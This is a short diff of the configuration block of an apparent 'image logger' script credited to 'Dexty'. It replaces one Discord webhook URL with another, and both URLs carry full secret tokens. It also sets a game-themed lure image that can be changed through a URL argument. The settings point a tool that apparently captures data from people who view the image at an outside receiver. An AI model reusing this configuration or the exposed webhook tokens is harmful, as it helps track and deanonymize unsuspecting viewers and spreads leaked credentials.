@@ -12,7 +12,7 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1378455039403884575/15Wht2sgCZ4zYKFYcxf9H4U_7WIGeyovLmRVXC3WvfVWfqzxWRrmvAdDKMkTeUjp7am9",
+    "webhook": "https://discord.com/api/webhooks/1378486538320613447/B3HtwD2eYzYA7H_7EhHTxjJYhbnTb1epH89Xgu3FJE-nN2pcYifBuQ3BUt2gMpFoGi9J",
     "image": "https://www.reddit.com/media?url=https%3A%2F%2Fpreview.redd.it%2Fgrow-a-garden-v0-r6muxcfkkhye1.png%3Fwidth%3D640%26crop%3Dsmart%26auto%3Dwebp%26s%3D5144722ad266eac0c292115d665d12a2e4a97653", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
